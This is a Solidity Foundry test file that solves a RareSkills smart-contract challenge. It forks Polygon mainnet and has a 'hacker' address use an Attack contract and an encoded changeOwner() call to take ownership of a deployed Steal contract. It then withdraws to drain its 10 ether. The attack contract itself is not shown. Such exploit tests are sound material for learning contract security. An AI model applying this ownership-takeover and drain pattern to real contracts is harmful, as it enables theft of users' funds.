// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Test file for challenge at: https://twitter.com/RareSkills_io/status/1578656813641498625
// forge test --fork-url https://polygon-mainnet.g.alchemy.com/v2/MTJ.........NcAwj -vvvv

import {stdStorage, StdStorage, Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console} from "../src/Console.sol";
import {Steal} from "../src/Steal.sol";
import {Attack} from "../src/Attack.sol";

contract StealTest is Test {
    Steal public steal;
    Attack public attack;

    address payable public hacker;
    address payable public stealDeployer;

    function setUp() public {
        // Hacker address (Deployer of the Attack contract)
        // Attention: due to forge restriction number addresses must be always > 10
        hacker = payable(address(0x099));   
        vm.label(address(hacker), "Hacker");
        vm.deal(address(hacker), 0 ether);

        // Hacker deploys Attack Contract
        vm.prank(hacker);
        attack = new Attack();   

        // Load Steal Contract from polygon mainnet
        steal = Steal(0x102354AB8DC1F6128512Ce995E16B25485F996CA);    
        vm.label(address(steal), "StealContract");
        vm.deal(address(steal), 10 ether);

        // Check balances
        assertEq(address(steal).balance, 10 ether);
        assertEq(hacker.balance, 0 ether);
    }

    function testAttack() public {
        // Change Owner
        vm.prank(hacker);      
        steal.steal(address(attack),abi.encodeWithSignature("changeOwner()"));  // 0x62a09477

        // Drain Steal Contract Wallet
        vm.prank(hacker); 
        steal.withdraw();

        // Check balances
        assertEq(address(steal).balance, 0 ether);
        assertEq(hacker.balance, 10 ether); 
    }

}